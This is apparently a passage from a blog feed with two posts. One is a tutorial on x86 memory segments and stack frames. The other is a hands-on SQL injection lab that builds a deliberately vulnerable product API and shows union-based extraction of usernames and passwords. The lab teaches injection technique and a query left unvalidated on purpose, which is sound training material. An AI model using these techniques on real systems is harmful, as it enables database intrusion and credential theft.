The execution process is non-linear. When the executable first loaded into memory, EIP (instruction pointer) 
register is first set to the first instruction loaded in the text segment. Then, the processor gets into the 
execution loop state as following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Read the instruction written in the memory address that EIP points to.&lt;/li&gt;
  &lt;li&gt;Adds the byte length of the instruction to EIP.&lt;/li&gt;
  &lt;li&gt;Execute the instruction that was read in the first step.&lt;/li&gt;
  &lt;li&gt;Loop back. Go back to the fist step.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As mentioned before, execution process is non-linear, sometimes in the text segment, instruction pointer will 
encounter a call instruction or a jump, which basically sets the EIP to a different address of the memory instead
of incrementing it by the previously read instruction’s byte length. If the EIP is changed in the execution step,
EIP will point and loop back to the first step back, and then execute that instruction found at the address of
whatever EIP was changed to.&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;text-segment&quot;&gt;Text Segment&lt;/h2&gt;
&lt;p&gt;Write permission in disabled in the text segment since it is not used to store variables, only code. This security 
mechanism is there for to prevent malicious activity which involves modifying the pre-compiled code into something else.
Any write attempt into this segment of the memory will cause the program to alert the user that something restricted 
happened, and program will be killed. Since that segment is in read-only mode, it can be shared among different copies 
of the program, allowing multiple proccesses or threads to run at the same time without problem. Plus, text segment
has a fixed size since nothing ever changes in it.&lt;/p&gt;

&lt;h2 id=&quot;data-and-bss-segment&quot;&gt;Data and BSS Segment&lt;/h2&gt;
&lt;p&gt;The data and bss segments are used to store static and global variables. The &lt;strong&gt;data segment&lt;/strong&gt; is being used to store 
&lt;strong&gt;initialized&lt;/strong&gt; global and static variables while the &lt;strong&gt;bss segment&lt;/strong&gt; is being used to store their uninitialized
counterparts. Those segments also fixed size segments regardless of the fact that they are writable. Global
variables persist, despite the functional context. Both global and static variables are able to persist
because they are stored in their own memory segments.&lt;/p&gt;

&lt;h2 id=&quot;heap-segment&quot;&gt;Heap Segment&lt;/h2&gt;
&lt;p&gt;The &lt;strong&gt;heap segment&lt;/strong&gt; is a memory segment which the programmers have a direct control over. It is programmable.
Blocks of the heap segment can be allocated and used for whatever the program needs. Unlike the text, bss and the 
data segment, heap does not have a fixed size, it can grow larger or smaller. The memory chunks within 
the heap is managed by de-allocator and allocator algorithms. Those algorithms enable programmers to reserve
a region of the heap memory for a required use or remove reservation to allow that portion of the memory 
to be reusable again for a later reservation. Heap will dynamically shrink and grow depending on how much memory 
is allocated for use. The growth of the heap moves downward toward the high memory addresses.&lt;/p&gt;

&lt;h2 id=&quot;stack-segment&quot;&gt;Stack Segment&lt;/h2&gt;
&lt;p&gt;The &lt;strong&gt;stack&lt;/strong&gt; segment also has variable size and is used as a temporary pile 
to store local function variables and context during function calls. When a program calls for a function, EIP will 
point to the first instruction written for that function, and that function will have its own variables within its 
function scope, and a new stack frame will be created for that function. After a function call EIP does not immidiately
jumps to the address written on it, first the CPU pushes all the parameters passed to that function to the stack, then, since 
the EIP have to go back to the instruction where it was left before the function call, the return address and the
stack base pointer will be passed to the stack. When the last instruction of the called function is read by the EIP,
return address and base pointer address pushed to the stack before the function call will be read and by the 
instruction and stack pointer, and execution will continue from where it was left. All of this information is stored 
together on the stack in what is collectively called a stack frame. The stack contains many stack frames.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;In general computer science terms, a stack is an abstract data structure&lt;br /&gt;
that is used frequently. It has first-in, last-out (FILO) ordering, which means the
first item that is put into a stack is the last item to come out of it. 
You can’t get the first bead off until you have removed all the other beads. When an
item is placed into a stack, it’s known as pushing, and when an item is removed
from a stack, it’s called popping.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Stack segment, as the name implies,
is a stack data structure, which stores all the stack frames. The ESP (stack pointer) is used to store the address 
of the last data pushed onto the stack. That address is constantly changin as the PUSH and POP operations are executed 
by the CPU. As this behavior being dynamic, just like heap, stack segment does not have a fixed size. Stack segment 
grows upward in a visual listing of memory, toward lower memory addresses, as opposed to the heap.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As I briefly mentioned before, when a function called, several things are pushed into to the stack.
The EBP (base pointer, sometimes called frame pointer FP), is used to reference local function variables
in the current stack frame, it stores the starting address of the active stack frame. Each stack frame
contains parameters to the function, its local variables, and two pointers that are neccesarry to put things
back the way they were. The saved frame pointer (SFP) and the return address. The SFP is used to restore EBP to 
its previous value, which is the starting address of the previous stack frame. And the return address is used to 
restore EIP to the next instruction found after the function call. This restores the functional context of the 
previous stack frame.&lt;/p&gt;

&lt;h2 id=&quot;stack-practices-on-x86-architecture&quot;&gt;Stack Practices on X86 Architecture&lt;/h2&gt;

&lt;p&gt;The following C code has two functions, main() and test_function().
&lt;img src=&quot;/assets/img/posts/memory-segmentation/9.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Inside the main function the program declares a function called test_function(). This function 
takes four integer parameters. The local variables for this function are an integer called flag
and a 10 byte long character array called buffer. The machine instructions for this code will be 
placed in the text segment while the local variables and the parameters stored in the stack. After
compiling the program, we can examine the inner mechanisms with GDB (GNU debugger). The following 
picture illustrates the disassembled machine instructions for main() and test_function().
The main() function starts at 0x08048344. There is something called &lt;strong&gt;function prologue&lt;/strong&gt; or 
&lt;strong&gt;procedure prologue&lt;/strong&gt;. Each function has to start with a function prologue. The first three 
instructions for test_function() and the first six instructions for main() function are the procedure 
prologue instructions. They save base pointer in the stack, and open up space in the 
stack for the local variables. Depending on which compiler being used the disassembled instructions and the 
function prologue would differ slightly. However, in general, those instructions are required in order to build the 
stack frame for the called function.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Machine instructions for main().
&lt;img src=&quot;/assets/img/posts/memory-segmentation/10.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Machine instructions for test_function().
&lt;img src=&quot;/assets/img/posts/memory-segmentation/11.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;After the initial execution of the program, the main() function executes its own function prologue in those 
first six instructions. When the stack frame is set, main() function immediately calls for the test_function(). When the
the test_function() is called, after the stack frame is created, four values are pushed to the stack in 
reverse order, since stack is first in lost out (FILO). The arguments are 1 ,2 ,3 , 4. Therefore, they are 
pushed in the stack as 4, 3, 2 and finally 1. Those values correspond to the a, b, c, d variables.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;0x08048367 &amp;lt;main+16&amp;gt;: mov DWORD PTR [esp+12],0x4
0x0804836f &amp;lt;main+24&amp;gt;: mov DWORD PTR [esp+8],0x3
0x08048377 &amp;lt;main+32&amp;gt;: mov DWORD PTR [esp+4],0x2
0x0804837f &amp;lt;main+40&amp;gt;: mov DWORD PTR [esp],0x1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In C programming language each integer uses 4-bytes. Since a RAM block is 1-byte, the value of those 
integers will be spread into four consecutive RAM addresses. As you can see first integer 0x1 written
at the first address where the newly created stack frame’s pointer points. esp, esp+1, esp+2, esp+3 will store 
0x1 as 0x00000001. After all those four parameters are pushed to the stack, the progam calls for the test_function(). 
Before setting the EIP to the first instructions of the test_function(), the &lt;strong&gt;call&lt;/strong&gt; instruction will push the return 
address to the stack in order to restore the EIP when the execution of the called function is over. 
In this case, the return address would point to the leave instruction in main() at 0x0804838b&lt;/p&gt;

&lt;p&gt;The call instruction both stores the return address on the stack and jumps
EIP to the beginning of test_function(), so test_function()’s procedure prologue
instructions finish building the stack frame. In this step, the current
value of EBP is pushed to the stack. This value is called the saved frame
pointer (SFP) and is later used to restore EBP back to its original state.
The current value of ESP is then copied into EBP to set the new frame pointer.
This frame pointer is used to reference the local variables of the function
(flag and buffer). Memory is saved for these variables by subtracting from
ESP. In the end, the stack frame looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/memory-segmentation/12.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We can watch the stack frame construction on the stack using GDB. In the
following output, a breakpoint is set in main() before the call to test_function()
and also at the beginning of test_function(). GDB will put the first break-
point before the function arguments are pushed to the stack, and the second
breakpoint after test_function()’s procedure prologue. When the program is
run, execution stops at the breakpoint, where the register’s ESP (stack pointer),
EBP (frame pointer), and EIP (execution pointer) are examined.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/memory-segmentation/13.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As you can observe from the picture, the EIP points to the 0x8048367 &amp;lt;main+16&amp;gt;, 
where the EIP instructs the program to push the first parameter of the test_function() to 
the stack. However, that instruction is not executed yet since there is a breakpoint. 
It also means that since the call instruction is not invoked yet, the current stack frame is 
still belong to the main(). If we subtract the current value of the EBP from the ESP we can find out how many bytes are allocated 
in the stack for the main() function’s stack frame.&lt;br /&gt;
0xbffff818 - 0xbffff800 = 0x18&lt;br /&gt;
0x18 (24) bytes are allocated in the stack for the main() function’s stack frame. It is possible to verify this value
by observing the third instruction of the main() function’s machine code where it subtracts 0x18 from the ESP.
Then, we can observe the upcoming five instructions after the first breakpoint. The CPU will push all the parameters
to the stack then invoke the call instruction.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;First, let’s see how does the stack frame allocated for main() look like before and after the breakpoints.&lt;br /&gt;&lt;br /&gt;
Before the call:
&lt;img src=&quot;/assets/img/posts/memory-segmentation/14.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
Before the CPU pushes those integer parameters to the stack in order to 
prepare for the upcoming function call, this is how those allocated 24 bytes look like.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;After the call:
&lt;img src=&quot;/assets/img/posts/memory-segmentation/16.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The next breakpoint is just after the &lt;strong&gt;function prologue&lt;/strong&gt; for the test_function(). Therefore, continuing
built the new stack frame. 
As you can see those function parameters are located at the top of the main() function’s stack. The key takeaway
from that behavior is that, those function parameters won’t be located in test_function()’s stack frame. Instead,
they will be referenced via its own base pointer (EBP).&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;And this is how newly created stack fame looks like: 
Just like every 
local variable, flag and char local variables will be referenced relative to the frame pointer (EBP).
&lt;img src=&quot;/assets/img/posts/memory-segmentation/17.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;You may wonder, in test_function’s stack frame, none of the values listed are corresponds neither to the return 
address nor to the saved frame pointer. Those values are stored between the two stack frames. There is an 8-byte address gap 
between the new EBP and the old ESP. If that was not the case the new EBP would be sharing the old EBP’s value, which is 
0xbffff800. Instead, the new value for the EBP is 0xbffff7f8.&lt;br /&gt;
0xbffff800 - 0xbffff7f8 = 0x8&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Therefore, the new EBP’s address stores the last byte (research little endian byte) of the saved frame pointer (SFP).
If we go further 8 more bytes from the new EBP, we will hit to the address of the old ESP. And that address
will be storing the last byte of the first integer parameter passed to the test_function(). Let’s see.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/memory-segmentation/18.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;By referencing the new EBP, program can locate the parameters, SFP and return address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/memory-segmentation/19.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Number&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Correlation&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Saved frame pointer (SFP)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Return address&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int a&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int b&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int c&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int d&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;It is best to visualize the memory by using a diagram. This is how the frames are set.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/memory-segmentation/diagram.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;After the execution finishes, the entire stack frame is popped off of the
stack, and the EIP is set to the return address, so the program can continue
execution. If another function was called within the function, another stack
frame would be pushed onto the stack, and so on. As each function ends, its
stack frame is popped off of the stack, so execution can be returned to the
previous function. This behavior is the reason this segment of memory is
organized in a FILO data structure.
The various segments of memory are arranged in the order they
were presented, from the lower memory addresses to the higher memory
addresses. Since most people are familiar with seeing numbered lists that
count downward, the smaller memory addresses are shown at the top.
Some texts have this reversed, which can be very confusing; so for this
paper, smaller memory addresses
are always shown at the top. Most
debuggers also display memory in
this style, with the smaller memory
addresses at the top and the higher
ones at the bottom.
Since the heap and the stack
are both dynamic, they both grow
in different directions toward each
other. This minimizes wasted space,
allowing the stack to be larger if the
heap is small and vice versa.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/memory-segmentation/20.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;memory-segments-in-c-language&quot;&gt;Memory Segments in C language&lt;/h1&gt;

&lt;p&gt;In C programming language, just like the other languages, compiled code take its place in the code segment 
while, while variables sits in the remaining segments. Depending on the how the variable is defined, the variables
will reside in different segments. If a variable defined at the outside of a function, it is considered as a &lt;strong&gt;global&lt;/strong&gt; 
variable. The &lt;strong&gt;static&lt;/strong&gt; keyword is can also be prepended to any variable decleration to make the variable static. If a 
static or global variable initialized with a value, they will be stored in the &lt;strong&gt;data segment&lt;/strong&gt;; otherwise, these 
variables will be located in the BSS segment. The memory on the heap memory must be allocated first by using a 
memory allocation function called malloc(). In general, pointers are used to reference memory on the heap segment.
Finally, the remaining variables will reside in the stack. Since the stack segment contains many stack frames
within, stack variables can maintain uniqueness within different functional contexts.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The following code will explain these concepts in C.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/memory-segmentation/21.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/memory-segmentation/22.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Most of the concepts are self-explanatory since the variable names are descriptive and each variable grouped 
with their segment couples. Two identical named stack variables are declared in order to illustrade 
their functional contexts. The heap variable is declared as an integer pointer, which will point to the memory address 
allocated on the heap segment. malloc() function is called allocate four bytes in the heap segment. Since the newly 
allocated heap memory could be of any data type, the malloc() function returns a &lt;strong&gt;void&lt;/strong&gt; pointer. It then type casted
into an integer pointer.&lt;/p&gt;

&lt;p&gt;Summary:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Initialized &lt;strong&gt;global&lt;/strong&gt; and &lt;strong&gt;static&lt;/strong&gt; variables will be stored in the Data Segment.&lt;/li&gt;
  &lt;li&gt;Uninitialized &lt;strong&gt;global&lt;/strong&gt; and &lt;strong&gt;static&lt;/strong&gt; variables will be stored in the BSS Segment.&lt;/li&gt;
  &lt;li&gt;Heap variables will be stored in the Heap Segment.&lt;/li&gt;
  &lt;li&gt;Stack variables, in the both functions, will be stored in the Stack Segment in different Stack Frames.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The first two initialized variables have the lowers memory addresses. It is because the Text Segment starts from
the lowest memory address and the Data Segment resides where the Text Segment ends. The next two uninitialized variables 
are stored in the BSS segment. The memory addresses for those variables are slightly bigger then the addresses which points
to the variables in the Data Segment since the BSS Segment being initialized where the Data Segment ends. Since both 
segments are fixed size, there is verry litle wasted space, and the addresses are not very far apart.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Heap Segment is not fixed size, and more space can be allocated on the run. And the first address of the Heap Segment
starts where the BSS Segment ends. Finally, the stack variables have the greatest addresses since the Stack Segment starts
where the memory ends. Stack Segment is also not fixed size, which means it will grow towards to the heap whereby heap 
grows toward to the stack. This allows both memory segments to be dynamic without wasting any unnecesarry space in memory.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The first stack_var in the main() function’s context resides in the Stack Segment within its own stack frame. The second 
stack_var in the function() has its own functional context, thereby that variable is stored within a different stack
frame in the Stack Segment. When the function() is called, CPU will initialize a function prologue in order to create 
a new stack frame in the stack to store stack_var (among other data) for function()’s context. Since the stack grow
back up toward the Heap Segment with each stack frame and pushed data, the memory address for the second stack_var 
(0xbffff814) is smaller than the address for the first stack_var (0xbffff834) found within main()’s context.&lt;/p&gt;

&lt;h1 id=&quot;using-the-heap&quot;&gt;Using the Heap&lt;/h1&gt;

&lt;p&gt;Using the other segments of the RAM is an automated process, programmer does not have to be attentive in to the 
segmentation process. However, when it comes to heap, the programmer have to manually set and calibrate the use 
of the variables. As previously illustrated, heap memory allocation is done by a memory allocation function called 
malloc() in C. This function accepts a size as its one and only argument and reserves that much space in the heap
segment as bytes, returning initial address of that space as a void pointer. If the malloc() function is not able 
to allocate any space for some reason, it will return a NULL pointer with a value of 0 instead. The corresponding 
de-allocation function is free(). This function accepts a pointer as its one and only argument and frees that 
previously reserved memory space for later use.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/memory-segmentation/23.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/memory-segmentation/24.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;This program takes a command line argument and uses this argument as the size for the heap reservation which 
will be allocated by the malloc() function. Then it uses malloc() and free() functions to allocate and de-allocate
the memory. printf() statements are being used in order to debug what is actually happening. Since the malloc()
function does not know what kind of data will be stored in that reserved space, the void pointer should be type
casted into the appropriate type. After each malloc() call, there is an error-checking functionality that check 
whether or not the reservation process were successfull or not. If the allocation fails, fprintf() is called to 
direct a text message to the standart error file descriptor and program exits.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/memory-segmentation/25.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 02 Dec 2022 22:20:00 +0000</pubDate>
        <link>http://localhost:4000/2022/12/02/memory-segmentation/</link>
        <guid isPermaLink="true">http://localhost:4000/2022/12/02/memory-segmentation/</guid>
        
        <category>c</category>
        
        <category>assembly</category>
        
        <category>x86</category>
        
        <category>32-bit</category>
        
        <category>memory-segmentation</category>
        
        <category>memory-segmentation</category>
        
        
      </item>
    
      <item>
        <title>SQL Injection Lab</title>
        <description>&lt;h1 id=&quot;sql-injection-lab&quot;&gt;SQL Injection Lab&lt;/h1&gt;
&lt;p&gt;This blog post will examine all kind of SQL injection techniques in detail. 
Sometimes it can be hard to understand how those injections work since there 
is no access to the backend code while conducting a penetration test to an application.
Attacker have to figure out how the backend implementation designed by examining the 
behaviour of the API in order to exploit those vulnerable endpoints.&lt;/p&gt;

&lt;p&gt;However, instead of using some prepeared vulnerable training platform,
we will write our own vulnerable backend API. Therefore, we can precisely
see how our injections interacts with the code.&lt;/p&gt;

&lt;h1 id=&quot;sql-injection-types&quot;&gt;SQL Injection Types&lt;/h1&gt;

&lt;h2 id=&quot;in-band-sqli&quot;&gt;In-Band SQLi&lt;/h2&gt;
&lt;p&gt;In-Band SQLi is the most common and easiest to exploit since the attacker can use the in-band 
network communication channel for both deploy the attack and extract data.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;h3 id=&quot;union-based-sqli&quot;&gt;Union-Based SQLi&lt;/h3&gt;
    &lt;p&gt;Union-Based SQLi is an In-Band SQLi technique where attacker concats additional SELECT 
queries to the end of the original query in order to return multiple query results in a single HTTP response.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h3 id=&quot;error-based-sqli&quot;&gt;Error-Based SQLi&lt;/h3&gt;
    &lt;p&gt;Error Based SQLi is an In-Band SQLi technique and occurs when an attacker can see errors thrown by the 
database in the HTTP response. An attacker can exploit these errors and probe the database by manipulating the queries.&lt;/p&gt;
    &lt;h2 id=&quot;inferential-blind-sqli&quot;&gt;Inferential-Blind SQLi&lt;/h2&gt;
    &lt;p&gt;Unlike In-Band SQLi, Blind-SQLi takes longer for attacker to gather data from the database since the endpoint does not
return the result of the query within the HTTP response. Therefore, no data being transferred In-Band.
Instead, the attacker extracts data from the differentiating behaviors in the application by sending 
various payloads to the application.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h3 id=&quot;boolean-based-sqli&quot;&gt;Boolean-Based SQLi&lt;/h3&gt;
    &lt;p&gt;Boolean-Based SQLi is an Blind-SQLi technique where the attacker gathers data by forcing the database to return
different responses depending on whether the query returns a TRUE or FALSE.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h3 id=&quot;time-based-sqli&quot;&gt;Time-Based SQLi&lt;/h3&gt;
    &lt;p&gt;Time-Based SQLi is a Blind SQLi technique where the attacker sends an SQL query to the database which forces it to wait
for specific a amount of time depending on whether the query returns a TRUE or FALSE.&lt;/p&gt;
    &lt;h2 id=&quot;out-of-band-sqli&quot;&gt;Out-Of-Band SQLi&lt;/h2&gt;
    &lt;p&gt;Out-Of-Band SQLi is the last resort and needed when the attacker can not infer any differentiation via in-band
responses after trying all those methods mentioned above. It is the most difficult method used to extract data
from the database, as it is variable according to the type of database.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;hands-on-practice&quot;&gt;HANDS-ON PRACTICE&lt;/h1&gt;

&lt;p&gt;First of all, lets create a database
and implement some tables in it. We will use PostgreSql for that purpose.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/1.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We now have a database called &lt;strong&gt;db1&lt;/strong&gt; and two tables named as &lt;strong&gt;users&lt;/strong&gt; and &lt;strong&gt;products&lt;/strong&gt;.
The users table will mimic as login credentials. We wont be implementing any login page 
for that, we will aim to extract data from that table by using product display pages 
by assuming we already have logged in with some account and have access to those product 
display endpoints.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/2.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First thing is to connect the database to the application. Second create endpoint
as &lt;strong&gt;/api/products&lt;/strong&gt;. This page displays all the products exist in our database. 
This endpoint does not accept any input from http request.  Therefore it is impossible 
to inject any parameters to that query.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/3.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next endpoint will accept a parameter to scan a product with a specific id in the database. 
This parameter, which will be sent to the endpoint, will be used as the id of the queried product in the 
database.&lt;/p&gt;

&lt;p&gt;Send &lt;strong&gt;1&lt;/strong&gt; as the parameter.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/4.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Send &lt;strong&gt;2&lt;/strong&gt; as the parameter.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/5.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Send &lt;strong&gt;3&lt;/strong&gt; as the parameter.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/6.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The problem with that implementation, it can be seen in the code, the application does not perform
any input validation. Therefore an attacker can use any special character in parameter and perform arithmetical
operations in the database. The way to detect whether or not there is an sql injection, you should pick a reference point first.
If you can find a way to go back to that reference point with an unexpected parameter, it means the enpoint is vulnerable to SQLi.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/8.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Passing both &lt;strong&gt;1&lt;/strong&gt; and &lt;strong&gt;3-2&lt;/strong&gt; as parameters bringing the same response. After that point
an attacker can easily pipe that database to himself with right methods.&lt;/p&gt;

&lt;h2 id=&quot;union-based-sqli-1&quot;&gt;UNION BASED SQLi&lt;/h2&gt;
&lt;p&gt;If the database returns the output of the query within the HTTP response, you can use perform &lt;strong&gt;UNION&lt;/strong&gt; based
sql injection. In order for this attack to work, number of the columns comes from &lt;strong&gt;UNION SELECT&lt;/strong&gt; must match 
with the original query. Also type of those columns should be same.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/9.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Eventually the following query will be performed at server side.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UNION&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In every database there are tables to hold all the metadata related to that database. &lt;strong&gt;information_schema.tables&lt;/strong&gt;
holds all the table names withing that database.&lt;/p&gt;

&lt;p&gt;All databases have a table to hold user credentials. General rule of thumb, those tables named as &lt;strong&gt;users&lt;/strong&gt;. It can
have a specific prefix or suffix, such as knucklesec_users for example. In this case &lt;strong&gt;users&lt;/strong&gt; is the name of it.&lt;/p&gt;

&lt;p&gt;There is an additional row in the HTTP response when
an existing table is queried and no additional rows for the unexisting table.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/12.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/13.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, it is known that there is a table named &lt;strong&gt;users&lt;/strong&gt;, however it also needed to know the column names of that table.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/15.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
Two rows have returned from that query. Column names are &lt;strong&gt;username&lt;/strong&gt; and &lt;strong&gt;password&lt;/strong&gt; respectively.
&lt;br /&gt;
Extraction of the values in these columns:
First &lt;strong&gt;usernames&lt;/strong&gt;.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/16.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then &lt;strong&gt;passwords&lt;/strong&gt;.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/17.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;inferential-blind-sqliboolean-based&quot;&gt;Inferential-Blind SQLi/Boolean-Based&lt;/h2&gt;

&lt;p&gt;It is called &lt;strong&gt;Blind SQLi&lt;/strong&gt; when the application still can be injected with some SQLi payloads, but does not return
the result of that query within HTTP response. Since it is not possible to see any rows and columns, UNION 
keyword won’t help. It is still possible to extract data from the database with different techniques.&lt;/p&gt;

&lt;p&gt;Code has been changed to alter the behavior of the application. This time instead of returning the details of the queried product,
application will inform the user whether or not the product exists.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/18.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
